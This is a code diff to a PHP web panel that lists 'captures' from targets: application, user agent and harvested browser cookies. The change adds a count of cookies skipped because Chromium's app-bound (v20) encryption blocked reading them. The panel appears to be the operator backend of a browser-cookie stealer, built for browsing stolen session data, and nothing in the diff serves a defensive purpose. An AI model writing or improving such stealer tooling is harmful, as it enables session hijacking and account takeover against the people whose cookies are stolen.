@@ -196,6 +196,7 @@ function render_capture(int $id): void
 
     $data = json_decode((string)$row['payload'], true);
     $cookies = is_array($data['cookies'] ?? null) ? $data['cookies'] : [];
+    $skipped = (int)($data['skipped'] ?? 0);
 
     echo '<div class="head"><h1>Capture #' . (int)$row['id'] . '</h1>';
     echo '<span class="sub"><a href="index.php?p=captures">back to captures</a></span></div>';
@@ -210,6 +211,9 @@ function render_capture(int $id): void
     echo '<div class="k">application</div><div>' . h((string)$row['app']) . '</div>';
     echo '<div class="k">user agent</div><div class="mono" style="word-break:break-all">' . h((string)$row['agent']) . '</div>';
     echo '<div class="k">cookies</div><div>' . (int)$row['cookies'] . '</div>';
+    if ($skipped > 0) {
+        echo '<div class="k">skipped</div><div>' . $skipped . ' app-bound (v20)</div>';
+    }
     echo '</div>';
 
     echo '<form method="post" action="index.php?p=capture&id=' . (int)$row['id'] . '" data-confirm="Delete this capture?" style="margin-top:14px">';
@@ -220,7 +224,10 @@ function render_capture(int $id): void
     echo '</div>';
 
     if (!$cookies) {
-        echo '<div class="card"><div class="empty">This capture carried no cookies - the target had no browser store readable.</div></div>';
+        $why = $skipped > 0
+            ? 'Every cookie in this capture was app-bound (v20) - Chromium 127+ wraps those with a key only its own elevation service can open.'
+            : 'This capture carried no cookies - the target had no browser store readable.';
+        echo '<div class="card"><div class="empty">' . h($why) . '</div></div>';
         return;
     }
 
